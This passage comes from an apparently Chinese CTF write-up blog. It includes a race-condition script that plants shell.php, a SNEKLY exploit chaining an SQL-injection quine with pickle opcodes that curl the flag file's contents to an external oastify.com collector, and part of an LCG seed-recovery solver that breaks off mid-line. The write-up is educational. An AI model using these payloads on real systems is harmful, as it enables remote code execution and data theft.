class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        request = requests.session()<br>        data = &#123;<br>            <span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;login&#x27;</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>        &#125;<br>        request.post(<span class="hljs-string">&quot;http://challenge.yuanloo.com:27814/&quot;</span>, data=data)<br><br>        data = &#123;<br>            <span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;download_message&#x27;</span>,<br>            <span class="hljs-string">&#x27;data&#x27;</span>: <span class="hljs-string">&#x27;`. /???/???/???/???/??????????????`;&#x27;</span><br>        &#125;<br>        request.post(<span class="hljs-string">&quot;http://challenge.yuanloo.com:27814/&quot;</span>, data=data)<br><br>        <span class="hljs-keyword">if</span> requests.get(<span class="hljs-string">&quot;http://challenge.yuanloo.com:27814/uploads/shell.php&quot;</span>).status_code != <span class="hljs-number">404</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>)<br>            exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=WRITE, args=(session,))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br><br>    READ(session)<br></code></pre></td></tr></table></figure>
<h5 id="round-2-snekly复现"><a class="markdownIt-Anchor" href="#round-2-snekly复现"></a> [Round 2] SNEKLY(复现)</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, jsonify<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> LoginManager, UserMixin<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;060ac533d307&#x27;</span><br>app.static_folder = <span class="hljs-string">&#x27;static&#x27;</span><br>login_manager = LoginManager()<br>login_manager.init_app(app)<br>login_manager.login_view = <span class="hljs-string">&#x27;login&#x27;</span><br><br>user = &#123;&#125;<br><br>current_dir = os.path.dirname(os.path.abspath(__file__))<br><br>db_path = os.path.join(current_dir, <span class="hljs-string">&#x27;data.db&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">UserMixin</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, username, password_hash, data</span>):<br>        <span class="hljs-variable language_">self</span>.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password_hash = password_hash<br>        <span class="hljs-variable language_">self</span>.data = data<br><br><br><span class="hljs-meta">@login_manager.user_loader</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_user</span>(<span class="hljs-params">user_id</span>):<br>    conn = sqlite3.connect(db_path)<br>    cursor = conn.cursor()<br>    cursor.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>, (user_id,))<br>    user_data = cursor.fetchone()<br>    conn.close()<br><br>    <span class="hljs-keyword">if</span> user_data:<br>        <span class="hljs-keyword">return</span> User(<span class="hljs-built_in">id</span>=user_data[<span class="hljs-number">0</span>], username=user_data[<span class="hljs-number">1</span>], password_hash=user_data[<span class="hljs-number">2</span>], data=user_data[<span class="hljs-number">3</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">global</span> user<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名或密码不能为空&quot;</span>&#125;)<br><br>        <span class="hljs-keyword">try</span>:<br>            con = sqlite3.connect(db_path)<br>            cur = con.cursor()<br><br>            output = cur.execute(<br>                <span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &#123;post[username]!r&#125; AND password = &#123;post[password]!r&#125;&#x27;</span><br>                .<span class="hljs-built_in">format</span>(post=request.form)<br>            ).fetchone()<br><br>            <span class="hljs-keyword">if</span> output <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名或密码错误&quot;</span>&#125;)<br><br>            user[<span class="hljs-string">&#x27;id&#x27;</span>], user[<span class="hljs-string">&#x27;username&#x27;</span>], user[<span class="hljs-string">&#x27;password&#x27;</span>], user[<span class="hljs-string">&#x27;data&#x27;</span>] = output<br><br>            <span class="hljs-comment"># 使用安全的密码验证方法</span><br>            <span class="hljs-keyword">if</span> (user[<span class="hljs-string">&#x27;username&#x27;</span>] == username) <span class="hljs-keyword">and</span> (user[<span class="hljs-string">&#x27;password&#x27;</span>] == password):<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;登录成功&quot;</span>&#125;)<br>            <span class="hljs-keyword">else</span>:<br>                user = &#123;&#125;<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;用户名或密码错误&quot;</span>&#125;)<br>        <span class="hljs-keyword">except</span> sqlite3.Error <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;数据库错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;服务器错误，请稍后重试&quot;</span>&#125;)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;无效的请求方法&quot;</span>&#125;)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/unSer&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unSer</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = base64.b64decode(user[<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(keyword <span class="hljs-keyword">in</span> data <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> [<span class="hljs-string">b&#x27;getattr&#x27;</span>, <span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;map&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;exec&#x27;</span>, <span class="hljs-string">b&#x27;import&#x27;</span>]):<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;unSer&quot;</span>)<br>        pickle.loads(data)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unSer&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>看到有pickle的模块大抵应该是考察python的反序列化，定位一下关键代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">unSer</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = base64.b64decode(user[<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(keyword <span class="hljs-keyword">in</span> data <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> [<span class="hljs-string">b&#x27;getattr&#x27;</span>, <span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;map&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;exec&#x27;</span>, <span class="hljs-string">b&#x27;import&#x27;</span>]):<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;unSer&quot;</span>)<br>        pickle.loads(data)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unSer&quot;</span><br></code></pre></td></tr></table></figure>
<p>使用bp打一个dnslog</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quine</span>(<span class="hljs-params">data</span>):<br>    data = data.replace(<span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">&quot;REPLACE(REPLACE(REPLACE($$,CHAR(39),CHAR(34)),CHAR(36),$$), CHAR(92), CHAR())&quot;</span>)<br>    data1 = data.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>).replace(<span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">&quot;&#x27;$&#x27;&quot;</span>)<br>    data = data.replace(<span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">f&#x27;&quot;<span class="hljs-subst">&#123;data1&#125;</span>&quot;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    username = <span class="hljs-string">&quot;test\&quot;&#x27;&quot;</span><br><br>    opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__builtin__</span><br><span class="hljs-string">filter</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0(S&#x27;curl http://`cat /f*`.urpybxuysw5jjp2ie3koqo4ia9g14rsg.oastify.com&#x27;</span><br><span class="hljs-string">tp1</span><br><span class="hljs-string">0(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">g1</span><br><span class="hljs-string">tp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81p3</span><br><span class="hljs-string">0c__builtin__</span><br><span class="hljs-string">tuple</span><br><span class="hljs-string">p4</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">t\x81.&#x27;&#x27;&#x27;</span><br>    a = base64.b64encode(opcode).decode()<br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) &gt; <span class="hljs-number">58</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i) &lt; <span class="hljs-number">47</span>:<br>            res += <span class="hljs-string">&quot;||CHAR(&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i)) + <span class="hljs-string">&quot;)&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            res += <span class="hljs-string">&quot;||&quot;</span> + i<br>    res = res[<span class="hljs-number">2</span>:]<br><br>    password = <span class="hljs-string">f&quot; UNION SELECT $$, CHAR(<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;,&#x27;</span>.join(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(c)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> username)&#125;</span>), $$,(<span class="hljs-subst">&#123;res&#125;</span>);-- -&quot;</span><br>    password = quine(password)<br><br>    requests.post(url=<span class="hljs-string">&quot;http://challenge.yuanloo.com:29180/login&quot;</span>,<br>                  data=&#123;<br>                      <span class="hljs-string">&quot;username&quot;</span>: username,<br>                      <span class="hljs-string">&quot;password&quot;</span>: password<br>                  &#125;)<br><br>    requests.get(url=<span class="hljs-string">&quot;http://challenge.yuanloo.com:29180/unSer&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/SNEKLy.png" srcset="/img/loading.gif" lazyload alt="SNEKLy"></p>
<p>学学opcode吧</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">开头的 c<span class="hljs-strong">__builtin__</span>：<br>c 表示这个数据结构是一个类的调用。<br><span class="hljs-strong">__builtin__</span> 是 Python 内置模块，意味着后续会调用该模块中的函数。<br>filter 是内置函数，用于过滤序列。它将在后续的调用中被使用。<br>p0 表示将后续的对象（0表示第一个对象）保存到位置 0。<br>0(S&#x27;curl http://... 是一个字符串对象，表示要执行的命令。<br>这里的命令使用反引号执行 cat /f<span class="hljs-emphasis">*，并将输出发送到指定的 URL。</span><br><span class="hljs-emphasis">tp1 是另一个指令，用于标记后续的数据结构类型。</span><br><span class="hljs-emphasis">0(cos 说明后续数据是与 cos 相关</span><br><span class="hljs-emphasis">system 是 os 模块中的一个函数，用于执行系统命令。</span><br><span class="hljs-emphasis">g1 用于获取在之前定义的对象，可能是一个函数的引用。</span><br><span class="hljs-emphasis">tp2 标记下一个数据结构的类型。</span><br><span class="hljs-emphasis">0g0 指获取第一个对象（即命令字符串）。</span><br><span class="hljs-emphasis">g2 表示下一个对象的获取。</span><br><span class="hljs-emphasis">\x81 是一个转义字符，用于处理特定的内部格式。</span><br><span class="hljs-emphasis">p3 表示将此对象保存到位置 3。</span><br><span class="hljs-emphasis">0c<span class="hljs-strong">__builtin__</span> 和 tuple：</span><br><span class="hljs-emphasis">这段是为了创建一个元组，包含前面定义的对象。</span><br><span class="hljs-emphasis">最终的结构是一个包含 system 函数和命令的元组。</span><br><span class="hljs-emphasis">p4 将这个元组保存在位置 4。</span><br><span class="hljs-emphasis">(g3 是标记获取之前保存的对象（即要执行的命令）。</span><br></code></pre></td></tr></table></figure>
<h3 id="round-3"><a class="markdownIt-Anchor" href="#round-3"></a> Round 3</h3>
<h4 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3"></a> crypto</h4>
<h5 id="round-3-ezlcg"><a class="markdownIt-Anchor" href="#round-3-ezlcg"></a> [Round 3] ezlcg</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">22178</span>)<br><br><span class="hljs-comment"># 跳过前27行</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>    p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_lcg_parameters</span>(<span class="hljs-params">states, N</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;求解LCG的参数a和b&quot;&quot;&quot;</span><br>    diffs = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(states) - <span class="hljs-number">1</span>):<br>        diffs.append((states[i + <span class="hljs-number">1</span>] - states[i]) % N)<br><br>    a_candidates = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(diffs) - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> diffs[i + <span class="hljs-number">1</span>] != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">try</span>:<br>                a = (diffs[i + <span class="hljs-number">1</span>] * inverse(diffs[i], N)) % N<br>                a_candidates.append(a)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a_candidates) &gt; <span class="hljs-number">0</span>:<br>        a = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">set</span>(a_candidates), key=a_candidates.count)<br>        b = (states[<span class="hljs-number">1</span>] - a * states[<span class="hljs-number">0</span>]) % N<br>        <span class="hljs-keyword">return</span> a, b<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_seed</span>(<span class="hljs-params">N, num1, num2, num3</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;从三个连续状态值找到初始种子&quot;&quot;&quot;</span><br>    states = [num1, num2, num3]<br><br>    <span class="hljs-comment"># 求解a和b</span><br>    a, b = solve_lcg_parameters(states, N)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> b:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 反推seed</span><br>    seed = ((num1 - b) * inverse(a, N)) % N<br><br>    <span class="hljs-comment"># 验证</span><br>    state = seed<br>    verified = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> expected <span class="hljs-keyword">in</span> [num1, num2, num3]:<br>        state = (state * a + b) % N<br>        <span class="hljs-keyword">if</span> state != expected:<br>            verified = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> seed, a, b <span class="hljs-keyword">if</span> verified <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    data = p.recvuntil(<span class="hljs-string">&quot;seed =&quot;</span>.encode()).decode()<br><br>    a_match = re.search(<span class="hljs-string">r&#x27;a=(\d+)&#x27;</span>, data)<br>    b_match = re.search(<span class="hljs-string">r&#x27;b=(\d+)&#x27;</span>, data)<br>    N_match = re.search(<span class="hljs-string">r&#x27;N=(\d+)&#x27;</span>, data)<br>    num1_match = re.search(<span class="hljs-string">r&#x27;num1=(\d+)&#x27;</span>, data)<br><br>    <span class="hljs-keyword">if</span> a_match <span class="hljs-keyword">and</span> b_match <span class="hljs-keyword">and</span> N_match <span class="hljs-keyword">and</span> num1_match:<br>        a = <span class="hljs-built_in">int</span>(a_match.group(<span class="hljs-number">1</span>))<br>        b = <span class="hljs-built_in">int</span>(b_match.group(<span class="hljs-number">1</span>))<br>        N = <span class="hljs-built_in">int</span>(N_match.group(<span class="hljs-number">1</span>))<br>        num1 = <span class="hljs-built_in">int</span>(num1_match.group(<span class="hljs-number">1</span>))<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_seed_a_b</span>(<span class="hljs-params">a, b, N, num1</span>):<br>            left_side = (num1 - b) % N<br>            a_inv = inverse(a, N)<br>            seed = (left_side * a_inv) % N<br>            <span class="hljs-keyword">return</span> seed<br><br>        seed = find_seed_a_b(a, b, N, num1)<br>        p.sendline(<span class="hljs-built_in">str</span>(seed))<br>        response = p.recvuntil(<span class="hljs-string">&quot;success!&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(response.decode())<br><br>response = p.recvuntil(<span class="hljs-string">&quot;Challenge two,30 Round&quot;</span>.encode())<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Challenge two,30 Round&quot;</span> <span class="hljs-keyword">in</span> response.decode():<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        data = p.recvuntil(<span class="hljs-string">&quot;seed =&quot;</span>.encode()).decode()<br><br>        a_match = re.search(<span class="hljs-string">r&#x27;a=(\d+)&#x27;</span>, data)<br>        N_match = re.search(<span class="hljs-string">r&#x27;N=(\d+)&#x27;</span>, data)<br>        num1_match = re.search(<span class="hljs-string">r&#x27;num1=(\d+)&#x27;</span>, data)<br>        num2_match = re.search(<span class="hljs-string">r&#x27;num2=(\d+)&#x27;</span>, data)<br><br>        <span class="hljs-keyword">if</span> a_match <span class="hljs-keyword">and</span> N_match <span class="hljs-keyword">and</span> num1_match <span class="hljs-keyword">and</span> num2_match:<br>            a = <span class="hljs-built_in">int</span>(a_match.group(<span class="hljs-number">1</span>))<br>            N = <span class="hljs-built_in">int</span>(N_match.group(<span class="hljs-number">1</span>))<br>            num1 = <span class="hljs-built_in">int</span>(num1_match.group(<span class="hljs-number">1</span>))<br>            num2 = <span class="hljs-built_in">int</span>(num2_match.group(<span class="hljs-number">1</span>))<br><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">lcg_seed</span>(<span class="hljs-params">num1, num2, a, N</span>):<br>                b = (num2 - (a * num1) % N + N) % N<br>                seed = (num1 